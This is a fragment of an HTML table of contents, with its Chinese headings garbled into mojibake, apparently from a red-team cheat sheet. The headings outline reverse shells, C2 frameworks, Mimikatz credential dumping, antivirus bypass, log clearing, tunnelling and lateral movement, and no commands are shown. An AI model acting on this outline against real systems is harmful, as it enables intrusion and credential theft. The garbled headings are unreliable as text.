<li><a href="#netsh%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1">NETSHå¯åŠ¨æœåŠ¡</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%BC%80%E5%90%AF">æ³¨å…¥ç‚¹å¼€å¯</a></li>
<li><a href="#msf%E5%BC%80%E5%90%AF">MSFå¼€å¯</a></li>
<li><a href="#wmic%E5%BC%80%E5%90%AF">Wmicå¼€å¯</a></li>
<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99">é˜²ç«å¢™</a></li>
<li><a href="#%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">å¤šç”¨æˆ·ç™»å½•</a></li>
<li><a href="#rdp%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95">RDPè¿æ¥è®°å½•</a></li>
<li><a href="#%E5%88%A0%E9%99%A4%E7%97%95%E8%BF%B9">åˆ é™¤ç—•è¿¹</a></li>
</ul>
</li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E8%BD%AC%E5%8F%91">ç«¯å£æ˜ å°„&amp;è½¬å‘</a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#lcxexe">lcx.exe</a></li>
<li><a href="#ssh">SSH</a><ul>
<li><a href="#%E6%AD%A3%E5%90%91%E8%BD%AC%E5%8F%91">æ­£å‘è½¬å‘</a></li>
<li><a href="#%E5%8F%8D%E5%90%91%E8%BD%AC%E5%8F%91">åå‘è½¬å‘</a></li>
</ul>
</li>
<li><a href="#invoke-socksproxy">Invoke-SocksProxy</a></li>
<li><a href="#ssf">SSF</a><ul>
<li><a href="#%E5%8D%95%E5%B1%82%E7%BD%91%E7%BB%9C%E6%AD%A3%E5%90%91%E8%BD%AC%E5%8F%91">å•å±‚ç½‘ç»œæ­£å‘è½¬å‘</a></li>
<li><a href="#%E5%8D%95%E5%B1%82%E7%BD%91%E7%BB%9C%E5%8F%8D%E5%90%91%E8%BD%AC%E5%8F%91">å•å±‚ç½‘ç»œåå‘è½¬å‘</a></li>
</ul>
</li>
<li><a href="#netsh">Netsh</a></li>
<li><a href="#iptables">Iptables</a></li>
<li><a href="#chisel">chisel </a></li>
</ul>
</li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6">å‘½ä»¤&amp;æ§åˆ¶</a><ul>
<li><a href="#interactive-shell">Interactive shell</a></li>
<li><a href="#script-reverse-shell">Script reverse shell</a><ul>
<li><a href="#bash">bash</a></li>
<li><a href="#nc">nc</a></li>
<li><a href="#telnet">telnet</a></li>
<li><a href="#php">php</a></li>
<li><a href="#python">python</a></li>
<li><a href="#perl">perl</a></li>
<li><a href="#ruby">ruby</a></li>
</ul>
</li>
<li><a href="#openssl-encrypt-shell">OpenSSL encrypt shell</a><ul>
<li><a href="#linux">Linux</a></li>
<li><a href="#windows">Windows</a></li>
</ul>
</li>
<li><a href="#dnscat2">Dnscat2</a><ul>
<li><a href="#powercat">Powercat</a></li>
<li><a href="#dnscat2-exe">Dnscat2 exe</a></li>
</ul>
</li>
<li><a href="#dns-txt-command">DNS TXT Command</a></li>
<li><a href="#powershell">Powershell</a><ul>
<li><a href="#msfpowershell">MSF+Powershell</a></li>
<li><a href="#powercat">Powercat</a></li>
<li><a href="#nishang">Nishang</a><ul>
<li><a href="#bind-shell">Bind shell</a></li>
<li><a href="#%E5%8F%8D%E5%90%91shell">åå‘shell</a></li>
<li><a href="#udp%E5%8F%8D%E5%90%91shell">UDPåå‘shell</a></li>
<li><a href="#https">HTTPS</a></li>
<li><a href="#icmp">ICMP</a></li>
</ul>
</li>
<li><a href="#base64">Base64</a></li>
</ul>
</li>
<li><a href="#metasploit">Metasploit</a><ul>
<li><a href="#%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8">å¸¸è§„ä½¿ç”¨</a></li>
<li><a href="#%E6%8A%80%E5%B7%A7%E4%BD%BF%E7%94%A8">æŠ€å·§ä½¿ç”¨</a></li>
<li><a href="#%E6%A8%A1%E5%9D%97">æ¨¡å—</a><ul>
<li><a href="#auxiliary">Auxiliary</a></li>
<li><a href="#payload">Payload</a><ul>
<li><a href="#windows">Windows</a></li>
<li><a href="#linux">Linux</a></li>
<li><a href="#macos">MacOS</a></li>
<li><a href="#web">Web</a></li>
<li><a href="#android">Android</a></li>
<li><a href="#shellcode">shellcode</a></li>
<li><a href="#msf%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC">msfè®¾ç½®ç›‘å¬</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#meterpreter">Meterpreter</a><ul>
<li><a href="#%E4%BA%A4%E4%BA%92">äº¤äº’</a></li>
<li><a href="#%E6%8F%90%E6%9D%83">ææƒ</a></li>
<li><a href="#%E5%91%BD%E4%BB%A4">å‘½ä»¤</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">æ–‡ä»¶æ“ä½œ</a></li>
<li><a href="#%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">åæ¸—é€&amp;æƒé™ç»´æŒ</a></li>
<li><a href="#%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97">æ¸…ç†æ—¥å¿—</a></li>
</ul>
</li>
<li><a href="#msf%E6%B4%BE%E7%94%9Fcobalt-strike%E5%92%8Cempire">MSFæ´¾ç”ŸCobalt strikeå’ŒEmpire</a><ul>
<li><a href="#%E6%B4%BE%E7%94%9Fempire">æ´¾ç”ŸEmpire</a></li>
<li><a href="#%E6%B4%BE%E7%94%9Fcobalt-strike">æ´¾ç”ŸCobalt Strike</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#empire">Empire</a><ul>
<li><a href="#%E5%AE%89%E8%A3%85">å®‰è£…</a></li>
<li><a href="#%E7%9B%91%E5%90%AC">ç›‘å¬</a></li>
<li><a href="#%E7%94%9F%E6%88%90">ç”Ÿæˆ</a></li>
<li><a href="#%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA%E5%8F%8A%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C">è¿æ¥é¶æœºåŠå…¶ä»–æ“ä½œ</a></li>
<li><a href="#%E6%8F%90%E6%9D%83">ææƒ</a></li>
<li><a href="#%E6%A8%AA%E5%90%91">æ¨ªå‘</a><ul>
<li><a href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96">ä»¤ç‰Œçªƒå–</a></li>
<li><a href="#%E4%BC%9A%E8%AF%9D%E6%B3%A8%E5%85%A5">ä¼šè¯æ³¨å…¥</a></li>
<li><a href="#hash%E4%BC%A0%E9%80%92">Hashä¼ é€’</a></li>
</ul>
</li>
<li><a href="#%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96">åé—¨&amp;æŒä¹…åŒ–</a><ul>
<li><a href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81">æ˜ åƒåŠ«æŒ</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%AF%E5%8A%A8%E9%A1%B9">æ³¨å…¥æ³¨å†Œè¡¨å¯åŠ¨é¡¹</a></li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">è®¡åˆ’ä»»åŠ¡</a></li>
<li><a href="#wmi">WMI</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5ssp">æ³¨å…¥SSP</a></li>
</ul>
</li>
<li><a href="#collection%E4%BF%A1%E6%81%AF%E9%87%87%E9%9B%86">Collectionï¼ˆä¿¡æ¯é‡‡é›†ï¼‰</a></li>
<li><a href="#code_execution%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">Code_executionï¼ˆä»£ç æ‰§è¡Œï¼‰</a></li>
<li><a href="#credentials%E8%BA%AB%E4%BB%BD%E5%87%AD%E8%AF%81">Credentialsï¼ˆèº«ä»½å‡­è¯ï¼‰</a></li>
<li><a href="#exfiltration%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96">Exfiltrationï¼ˆæ•°æ®çªƒå–ï¼‰</a></li>
<li><a href="#exploitation%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8exp">Exploitationï¼ˆæ¼æ´åˆ©ç”¨EXPï¼‰</a></li>
<li><a href="#lateral_movement%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8">Lateral_movementï¼ˆæ¨ªå‘ç§»åŠ¨ï¼‰</a></li>
<li><a href="#management%E7%AE%A1%E7%90%86">Managementï¼ˆç®¡ç†ï¼‰</a></li>
<li><a href="#persistence%E6%8C%81%E4%B9%85%E5%8C%96">Persistenceï¼ˆæŒä¹…åŒ–ï¼‰</a></li>
<li><a href="#privesc%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">Privescï¼ˆæƒé™æå‡ï¼‰</a></li>
<li><a href="#recon%E4%BE%A6%E5%AF%9F">Reconï¼ˆä¾¦å¯Ÿï¼‰</a></li>
<li><a href="#situational_awareness%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5">Situational_awarenessï¼ˆæ€åŠ¿æ„ŸçŸ¥ï¼‰</a></li>
<li><a href="#trollsploit%E6%81%B6%E4%BD%9C%E5%89%A7">Trollsploitï¼ˆæ¶ä½œå‰§ï¼‰</a></li>
<li><a href="#empire-word">Empire Word</a></li>
<li><a href="#empire%E6%B4%BE%E7%94%9Fcobalt-strike%E5%92%8Cmsf">Empireæ´¾ç”ŸCobalt Strikeå’ŒMSF</a><ul>
<li><a href="#%E6%B4%BE%E7%94%9Fmsf">æ´¾ç”ŸMSF</a></li>
<li><a href="#%E6%B4%BE%E7%94%9Fcobalt-strike">æ´¾ç”ŸCobalt Strike</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#cobalt-strike">Cobalt Strike</a><ul>
<li><a href="#%E5%AE%89%E8%A3%85">å®‰è£…</a></li>
<li><a href="#%E9%83%A8%E7%BD%B2teamserver">éƒ¨ç½²TeamServer</a></li>
<li><a href="#%E6%A8%A1%E5%9D%97">æ¨¡å—</a></li>
<li><a href="#%E8%BF%9E%E6%8E%A5">è¿æ¥</a></li>
<li><a href="#%E7%9B%91%E5%90%AC%E5%99%A8">ç›‘å¬å™¨</a></li>
<li><a href="#%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97">æ”»å‡»æ¨¡å—</a></li>
<li><a href="#%E8%A7%86%E5%9B%BE%E6%A8%A1%E5%9D%97">è§†å›¾æ¨¡å—</a></li>
<li><a href="#%E4%BA%A4%E4%BA%92">äº¤äº’</a></li>
<li><a href="#beacon">Beacon</a></li>
<li><a href="#%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99">å…‹éš†ç½‘ç«™</a></li>
<li><a href="#office%E5%AE%8F">officeå®</a></li>
<li><a href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6">é’“é±¼é‚®ä»¶</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC">åŠ è½½è„šæœ¬</a></li>
<li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">æµè§ˆå™¨åŠ«æŒ</a></li>
<li><a href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">æƒé™ç»´æŒ</a></li>
<li><a href="#%E6%A8%AA%E5%90%91">æ¨ªå‘</a></li>
<li><a href="#%E9%9A%94%E7%A6%BB%E7%BD%91%E7%BB%9C">éš”ç¦»ç½‘ç»œ</a><ul>
<li><a href="#%E6%9D%83%E9%99%90%E6%9C%BA%E4%B8%AD%E8%BD%AC">æƒé™æœºä¸­è½¬</a></li>
<li><a href="#smb_beacon">SMB_beacon</a></li>
<li><a href="#ssh-login">SSH login</a></li>
</ul>
</li>
<li><a href="#%E4%BB%A3%E7%90%86">ä»£ç†</a></li>
<li><a href="#%E9%83%A8%E7%BD%B2vpn">éƒ¨ç½²VPN</a></li>
<li><a href="#cobalt-strike%E6%B4%BE%E7%94%9F-empire%E5%92%8Cmsf">Cobalt strikeæ´¾ç”Ÿ Empireå’ŒMSF</a><ul>
<li><a href="#%E6%B4%BE%E7%94%9Fempire">æ´¾ç”ŸEmpire</a></li>
<li><a href="#%E6%B4%BE%E7%94%9Fmsf">æ´¾ç”ŸMSF</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#jsrat">JSRat</a></li>
<li><a href="#crackmapexec">CrackMapExec</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#%E7%88%86%E7%A0%B4">çˆ†ç ´</a></li>
<li><a href="#%E5%8F%AF%E7%94%A8%E6%A8%A1%E5%9D%97">å¯ç”¨æ¨¡å—</a></li>
<li><a href="#pth">PTH</a></li>
<li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">æ‰§è¡Œå‘½ä»¤</a></li>
</ul>
</li>
<li><a href="#koadic">koadic</a></li>
<li><a href="#silenttrinity">SILENTTRINITY</a></li>
<li><a href="#browser-c2">Browser C2</a></li>
<li><a href="#dropbox-c2">DropBox C2</a></li>
<li><a href="#gmail-c2">Gmail C2</a><ul>
<li><a href="#gcat">Gcat</a></li>
<li><a href="#gdog">Gdog</a></li>
</ul>
</li>
<li><a href="#telegram-c2">Telegram C2</a></li>
</ul>
</li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">ä¿¡æ¯æ”¶é›†</a><ul>
<li><a href="#cmd">Cmd</a></li>
<li><a href="#wmi">Wmi</a></li>
<li><a href="#powerview">PowerView</a></li>
<li><a href="#linux">Linux</a></li>
</ul>
</li>
<li><a href="#http%E6%9C%8D%E5%8A%A1">HTTPæœåŠ¡</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">æ–‡ä»¶æ“ä½œ</a><ul>
<li><a href="#windows%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6">WindowsæŸ¥æ‰¾æ–‡ä»¶</a></li>
<li><a href="#linux%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6">LinuxæŸ¥æ‰¾æ–‡ä»¶</a></li>
<li><a href="#%E5%88%9B%E5%BB%BA">åˆ›å»º</a></li>
<li><a href="#%E5%8E%8B%E7%BC%A9">å‹ç¼©</a></li>
<li><a href="#%E8%A7%A3%E5%8E%8B">è§£å‹</a></li>
<li><a href="#%E4%BC%A0%E8%BE%93">ä¼ è¾“</a><ul>
<li><a href="#ftp">FTP</a></li>
<li><a href="#vbs">VBS</a></li>
<li><a href="#js">JS</a></li>
<li><a href="#bitsadmin">Bitsadmin</a></li>
<li><a href="#powershell">Powershell </a><ul>
<li><a href="#1">1</a></li>
<li><a href="#2">2</a></li>
<li><a href="#3">3</a></li>
<li><a href="#4">4</a></li>
<li><a href="#5">5</a></li>
</ul>
</li>
<li><a href="#certutil">Certutil</a></li>
<li><a href="#python">Python</a></li>
<li><a href="#perl">Perl</a></li>
<li><a href="#php">PHP</a></li>
<li><a href="#curl">Curl</a></li>
<li><a href="#wget">wget</a></li>
<li><a href="#nc">nc </a></li>
<li><a href="#scp">SCP</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#hash%E5%AF%86%E7%A0%81">Hash&amp;å¯†ç </a><ul>
<li><a href="#%E7%A0%B4%E8%A7%A3%E7%BD%91%E5%9D%80">ç ´è§£ç½‘å€</a></li>
<li><a href="#googlecolab%E7%A0%B4%E8%A7%A3hash">GoogleColabç ´è§£hash</a></li>
<li><a href="#%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5">å¯†ç ç­–ç•¥</a></li>
<li><a href="#%E5%BC%80%E5%90%AFwdigest">å¼€å¯Wdigest </a><ul>
<li><a href="#cmd">Cmd</a></li>
<li><a href="#powershell">powershell</a></li>
<li><a href="#meterpreter">meterpreter</a></li>
</ul>
</li>
<li><a href="#getpass">Getpass</a></li>
<li><a href="#quarkspwdump">QuarksPwDump</a></li>
<li><a href="#msf">MSF</a></li>
<li><a href="#empire">Empire</a></li>
<li><a href="#invoke-dcsync">Invoke-Dcsync</a></li>
<li><a href="#mimikatz">Mimikatz</a><ul>
<li><a href="#%E8%B0%83%E7%94%A8mimikatz%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8F%96">è°ƒç”¨mimikatzè¿œç¨‹æŠ“å–</a></li>
<li><a href="#%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8F%E6%8A%93hash">æ¨ªå‘æ‰¹é‡æŠ“hash</a><ul>
<li><a href="#schtasks">Schtasks</a></li>
<li><a href="#wmic">Wmic</a></li>
</ul>
</li>
<li><a href="#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8">ç›´æ¥ä½¿ç”¨</a></li>
<li><a href="#powershell-bypass">Powershell Bypass</a></li>
<li><a href="#net-20">.net 2.0</a></li>
<li><a href="#net-40-msbuild">.net 4.0 Msbuild</a></li>
<li><a href="#jscript">JScript</a></li>
<li><a href="#procdump64mimikatz">Procdump64+mimikatz</a></li>
<li><a href="#dumpert">Dumpert</a></li>
<li><a href="#cisco-jabber%E8%BD%AC%E5%82%A8lsass">Cisco Jabberè½¬å‚¨lsass</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA">ç»•è¿‡å¡å·´æ–¯åŸº</a></li>
<li><a href="#%E8%BF%9C%E7%A8%8Blsass%E8%BF%9B%E7%A8%8B%E8%BD%AC%E5%82%A8-physmem2profit">è¿œç¨‹LSASSè¿›ç¨‹è½¬å‚¨-Physmem2profit</a></li>
<li><a href="#sqldumpermimikatz">SqlDumper+mimikatz</a></li>
<li><a href="#mimipenguin">Mimipenguin</a></li>
</ul>
</li>
<li><a href="#%E7%BC%93%E5%AD%98hash%E6%8F%90%E5%8F%96">ç¼“å­˜hashæå–</a><ul>
<li><a href="#%E6%B3%A8%E5%86%8C%E8%A1%A8">æ³¨å†Œè¡¨</a></li>
<li><a href="#ninjacopy">Ninjacopy</a></li>
<li><a href="#quarks-pwdump">Quarks-pwdump</a></li>
</ul>
</li>
<li><a href="#%E5%9F%9Fhash%E6%8F%90%E5%8F%96">åŸŸhashæå–</a><ul>
<li><a href="#ntdsutil">Ntdsutil</a></li>
<li><a href="#vssadmin">Vssadmin</a></li>
<li><a href="#impacket">Impacket</a></li>
<li><a href="#ntdsdumpex">NTDSDumpex</a></li>
<li><a href="#wmi%E8%B0%83%E7%94%A8vssadmin">WMIè°ƒç”¨Vssadmin</a></li>
<li><a href="#powersploit">PowerSploit</a></li>
<li><a href="#nishang">Nishang</a></li>
<li><a href="#mimikatz">Mimikatz</a></li>
<li><a href="#msf">MSF</a></li>
</ul>
</li>
<li><a href="#lazagne">laZagne</a><ul>
<li><a href="#windows">windows</a></li>
<li><a href="#linux">Linux</a></li>
</ul>
</li>
<li><a href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF">æ•æ„Ÿä¿¡æ¯</a><ul>
<li><a href="#seatbelt">Seatbelt</a></li>
<li><a href="#vnc%E5%AF%86%E7%A0%81">VNCå¯†ç </a></li>
<li><a href="#navicat%E4%BF%A1%E6%81%AF">Navicatä¿¡æ¯</a></li>
<li><a href="#chrome%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">Chromeä¿å­˜çš„å¯†ç </a></li>
<li><a href="#foxmail">Foxmail</a></li>
<li><a href="#firefox%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">firefoxä¿å­˜çš„å¯†ç </a></li>
<li><a href="#securecrt">SecureCRT</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%A8%AA%E5%90%91">æ¨ªå‘</a><ul>
<li><a href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">æ¢æµ‹å­˜æ´»ä¸»æœº</a><ul>
<li><a href="#forping%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">For+Pingå‘½ä»¤æŸ¥è¯¢å­˜æ´»ä¸»æœº</a></li>
<li><a href="#nbtscan">NbtScan</a></li>
<li><a href="#nmap">NMAP</a><ul>
<li><a href="#%E4%BB%A3%E7%90%86nmap%E6%89%AB%E6%8F%8F">ä»£ç†nmapæ‰«æ</a></li>
</ul>
</li>
<li><a href="#netdiscover">NetDiscover</a></li>
<li><a href="#rp-scan">rp-scan</a></li>
<li><a href="#msf">MSF</a></li>
</ul>
</li>
<li><a href="#%E6%8E%A2%E6%B5%8B%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3">æ¢æµ‹æœåŠ¡&amp;ç«¯å£</a><ul>
<li><a href="#powershell">Powershell</a><ul>
<li><a href="#powersploit">Powersploit</a></li>
<li><a href="#nishang">Nishang </a></li>
</ul>
</li>
<li><a href="#smb">SMB </a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#cmd">CMD</a></li>
</ul>
</li>
<li><a href="#linux-samba%E6%9C%8D%E5%8A%A1">Linux SambaæœåŠ¡</a></li>
<li><a href="#msf">MSF</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3">ç«¯å£</a></li>
<li><a href="#%E6%9C%8D%E5%8A%A1">æœåŠ¡</a></li>
</ul>
</li>
<li><a href="#nc">Nc</a></li>
<li><a href="#masscan">Masscan</a></li>
<li><a href="#ptscan">PTScan</a></li>
<li><a href="#cobaltstrikek8-aggressor">CobaltStrike+K8 Aggressor</a><ul>
<li><a href="#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">å­˜æ´»ä¸»æœº</a></li>
<li><a href="#ms17010">MS17010</a></li>
<li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF">æ“ä½œç³»ç»Ÿä¿¡æ¯</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E7%AB%99%E7%82%B9banner%E6%A0%87%E9%A2%98%E6%89%AB%E6%8F%8F">å†…ç½‘ç«™ç‚¹bannerã€æ ‡é¢˜æ‰«æ</a></li>
<li><a href="#ftp%E7%88%86%E7%A0%B4">FTPçˆ†ç ´</a></li>
<li><a href="#wmi%E7%88%86%E7%A0%B4windows%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81">WMIçˆ†ç ´windowsè´¦æˆ·å¯†ç </a></li>
<li><a href="#%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F">æ€ç§‘è®¾å¤‡æ‰«æ</a></li>
<li><a href="#%E6%9E%9A%E4%B8%BE%E5%85%B1%E4%BA%AB">æšä¸¾å…±äº«</a></li>
<li><a href="#%E6%9E%9A%E4%B8%BEsql-server%E6%95%B0%E6%8D%AE%E5%BA%93">æšä¸¾SQL SERVERæ•°æ®åº“</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4ipc%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">æ‰§è¡Œå‘½ä»¤&amp;IPC&amp;è®¡åˆ’ä»»åŠ¡</a><ul>
<li><a href="#at">AT</a></li>
<li><a href="#schtasks">Schtasks</a></li>
<li><a href="#wmic">WMIC</a></li>
</ul>
</li>
<li><a href="#%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E7%99%BB%E8%BF%87%E7%9A%84%E6%9C%BA%E5%99%A8">å¿«é€Ÿå®šä½åŸŸç®¡ç†ç™»è¿‡çš„æœºå™¨</a></li>
<li><a href="#msf%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1">MSFæ·»åŠ è·¯ç”±</a></li>
<li><a href="#msf%E7%AE%A1%E9%81%93%E7%9B%91%E5%90%AC">MSFç®¡é“ç›‘å¬</a></li>
<li><a href="#%E4%BB%A3%E7%90%86">ä»£ç†</a><ul>
<li><a href="#ssh">SSH</a><ul>
<li><a href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86">æ­£å‘ä»£ç†</a></li>
<li><a href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86">åå‘ä»£ç†</a></li>
<li><a href="#ssh%E9%9A%A7%E9%81%93rc4%E5%8F%8C%E9%87%8D%E5%8A%A0%E5%AF%86">SSHéš§é“+rc4åŒé‡åŠ å¯†</a></li>
<li><a href="#%E5%85%AC%E7%BD%91ssh%E9%9A%A7%E9%81%93local-msf">å…¬ç½‘SSHéš§é“+Local MSF</a></li>
</ul>
</li>
<li><a href="#socks4a">socks4a</a></li>
<li><a href="#socks5">socks5</a></li>
<li><a href="#%E5%9F%BA%E4%BA%8Eweb%E7%9A%84socks5">åŸºäºwebçš„socks5 </a><ul>
<li><a href="#regeorg">reGeorg</a></li>
<li><a href="#neo-regeorg">Neo-reGeorg</a></li>
<li><a href="#abptts%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91">ABPTTSç«¯å£è½¬å‘</a></li>
<li><a href="#tunna%E8%BD%AC%E5%8F%91">Tunnaè½¬å‘</a></li>
</ul>
</li>
<li><a href="#earthworm">Earthworm</a><ul>
<li><a href="#%E6%AD%A3%E5%90%91%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%AD%98%E5%9C%A8%E5%A4%96%E7%BD%91ip">æ­£å‘(ç›®æ ‡æœºå­˜åœ¨å¤–ç½‘IP)ï¼š</a></li>
<li><a href="#%E5%8F%8D%E5%BC%B9socks5%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%97%A0%E5%A4%96%E7%BD%91ip">åå¼¹socks5(ç›®æ ‡æœºæ— å¤–ç½‘IP)ï¼š</a></li>
<li><a href="#%E4%BA%8C%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%9C%89%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91">äºŒçº§ç¯å¢ƒ(Aæœ‰å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘)ï¼š</a></li>
<li><a href="#%E4%BA%8C%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%97%A0%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91">äºŒçº§ç¯å¢ƒ(Aæ— å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘)ï¼š</a></li>
<li><a href="#%E4%B8%89%E7%BA%A7%E7%8E%AF%E5%A2%83a%E6%97%A0%E5%A4%96%E7%BD%91b%E5%86%85%E7%BD%91%E6%97%A0%E5%A4%96%E7%BD%91%E9%80%9Aac%E9%80%9Ab">ä¸‰çº§ç¯å¢ƒ(Aæ— å¤–ç½‘,Bå†…ç½‘æ— å¤–ç½‘é€šA,Cé€šB)ï¼š</a></li>
</ul>
</li>
<li><a href="#frp">Frp </a></li>
<li><a href="#ssf">SSF</a><ul>
<li><a href="#%E6%AD%A3%E5%90%91socks%E4%BB%A3%E7%90%86">æ­£å‘socksä»£ç†</a></li>
<li><a href="#%E5%8F%8D%E5%90%91socks%E4%BB%A3%E7%90%86">åå‘socksä»£ç†</a></li>
<li><a href="#%E5%A4%9A%E7%BA%A7%E7%BA%A7%E8%81%94">å¤šçº§çº§è”</a></li>
<li><a href="#%E5%8F%8D%E5%BC%B9shell">åå¼¹shell</a></li>
</ul>
</li>
<li><a href="#shadowsocks">Shadowsocks</a></li>
<li><a href="#goproxy">Goproxy</a></li>
<li><a href="#chisel">Chisel</a></li>
<li><a href="#%E4%BB%A3%E7%90%86%E8%BD%AF%E4%BB%B6">ä»£ç†è½¯ä»¶</a></li>
</ul>
</li>
<li><a href="#ngrok%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F">Ngrokå†…ç½‘ç©¿é€</a></li>
<li><a href="#ms17-010">MS17-010</a></li>
<li><a href="#ms08_067">MS08_067</a></li>
<li><a href="#%E6%94%BB%E5%87%BBmysql%E6%95%B0%E6%8D%AE%E5%BA%93">æ”»å‡»MySQLæ•°æ®åº“</a></li>
<li><a href="#%E6%94%BB%E5%87%BBmssql%E6%95%B0%E6%8D%AE%E5%BA%93">æ”»å‡»MSSQLæ•°æ®åº“</a></li>
<li><a href="#%E9%9A%94%E7%A6%BB%E4%B8%BB%E6%9C%BApayload">éš”ç¦»ä¸»æœºpayload</a></li>
<li><a href="#%E7%88%86%E7%A0%B4">çˆ†ç ´</a><ul>
<li><a href="#hydra">Hydra</a></li>
<li><a href="#medusa">Medusa</a></li>
<li><a href="#%E5%9F%9F%E5%86%85%E7%88%86%E7%A0%B4">åŸŸå†…çˆ†ç ´</a><ul>
<li><a href="#kerbrute">Kerbrute</a></li>
<li><a href="#domainpasswordspray">DomainPasswordSpray</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%96%B9%E7%A8%8B%E5%BC%8F%E5%86%85%E7%BD%91%E4%B8%8D%E4%BA%A7%E7%94%9Fsession">æ–¹ç¨‹å¼å†…ç½‘ä¸äº§ç”Ÿsession</a></li>
<li><a href="#kerberoasting">Kerberoasting</a><ul>
<li><a href="#spn%E5%8F%91%E7%8E%B0">SPNå‘ç°</a><ul>
<li><a href="#cmd">cmd</a></li>
<li><a href="#powershell">Powershell</a></li>
<li><a href="#empire">Empire</a></li>
</ul>
</li>
